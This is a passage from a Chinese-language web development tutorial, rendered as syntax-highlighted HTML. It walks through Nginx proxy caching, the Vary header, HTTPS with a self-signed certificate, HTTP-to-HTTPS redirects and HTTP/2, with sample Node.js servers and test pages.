attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span>    form<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> formData      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>test.com</code>来访问代理的网址</p><img src="image-20210126183044339.png" alt="成功" style="zoom:80%;"><p>补充：在<code>test.conf</code>文件中如果是否设置<code>proxy_set_header Host $host;</code>在服务端会返回会不同</p><p><img src="image-20210126184400512.png" alt=""></p><blockquote><p>host经过中间代理的层级后被修改</p></blockquote><p>​<br>​</p><h3 id="3-3-Nginx代理缓存">3.3 Nginx代理缓存</h3><p>代理缓存是在代理设置的，所有每一个新请求都会经过代理。在浏览器客户端，只要第一个用户请求了，代理服务器缓存之后，其他用户都可以使用代理服务器的缓存</p><p>修改<code>test.conf</code>：</p><p><img src="20190105210021993.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;   server {  listen      80;  server_name test.com;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }} server {  listen      80;  server_name a.test.com;   location /  {    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建一个文件夹，并创建<code>server.js</code>和<code>test.html</code>文件</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">wait</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/data'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=3, s-maxage=20'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以在<code>server.js</code>修改对应的返回头信息来实现各种配置（2.3 缓存Cache-Control）</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content, and data is: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> text  <span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126222337746.png" alt="第一次请求 从服务器获取 耗时长"></p><p><img src="image-20210126222518856.png" alt="第二次请求 从浏览器缓存读取"></p><p><img src="image-20210126222543578.png" alt="第三次请求 从代理缓存读取"></p><p>设置头信息Vary：指定在发生一个请求的时候，只要和服务器端的指定的http头的值相同的情况下，客户端才会使用缓存</p><pre class="line-numbers language-none"><code class="language-none">'Vary': 'X-Test-Cache'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content, and data is: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">function</span> <span class="token function">doRequest</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>    data<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">''</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      headers<span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token string">'X-Test-Cache'</span><span class="token operator">:</span> index<span class="token operator">++</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      data<span class="token punctuation">.</span>innerText <span class="token operator">=</span> text    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> doRequest<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126223806916.png" alt="多次请求"></p><p>​<br>​</p><h3 id="3-4-Nginx部署HTTPS服务">3.4 Nginx部署HTTPS服务</h3><p>在Nginx根目录下新建一个certs文件夹，并在里面打开git bash，输入以下命令，生成公钥和私钥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl req -x509 -newkey rsa:2048 -nodes -sha256 -keyout localhost-privket.pem -out localhost-cert.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="20190106113824992.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;  server {  listen      443;  server_name test.com;   listen ... ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126230619376.png" alt=""></p><p>这样直接访问的时候会出现<code>400 Bad Request The plain HTTP request was sent to HTTPS port</code>错误</p><p>需要再修改<code>test.conf</code>文件：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;  server {  listen 80;  server_name test.com;    listen 443 ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126231543378.png" alt="启动成功"></p><p>还可以通过配置来实现访问HTTP协议的网址时自动转到HTTPS协议上，修改<code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m; server {  listen        80 default_server;  listen        [::]:80 default_server;  server_name   test.com;  return 302 https://$server_name$request_uri;} server {    server_name test.com;   listen 443 ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有其他Nginx配置，可以查看：<a href="http://nginx.org/en/docs/http/configuring_https_servers.html#single_http_https_server">Nginx官方文档</a></p><h3 id="3-5-Nginx简单配置HTTP2">3.5 Nginx简单配置HTTP2</h3><blockquote><p>注意：需要支持HTTPS才能使用HTTP2，通过Nginx来开启HTTP2</p></blockquote><p>修改<code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m; server {  listen        80 default_server;  listen        [::]:80 default_server;  server_name   test.com;  return 302 https://$server_name$request_uri;} server {    server_name test.com;   listen 443 ssl http2;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server.js</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>   <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> img <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>      <span class="token string">'Link'</span><span class="token operator">:</span> <span class="token string">'&lt;/test.jpg&gt;; as=image; rel=preload'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'image/jpg'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span> <span class="token comment">// or close</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行<code>server.js</code>，并启动<code>Nginx</code></p><p><img src="image-20210127121127126.png" alt=""></p><p>HTTP1与HTTP2的比较</p><img src="image-20210127122742425.png" alt="HTTP1 vs HTTP2" style="zoom:80%;"><blockquote><p>不是所有浏览器都支持HTTP2，使用Ngnix开启HTTP2可以做到兼容HTTP1和HTTP2（ALPN方案）</p><p>而Ngnix与后端之间使用HTTP1</p></blockquote><p><img src="image-20210127123715040.png" alt="HTTP2"></p><p><img src="image-20210127124129626.png" alt="HTTP1"></p><h2 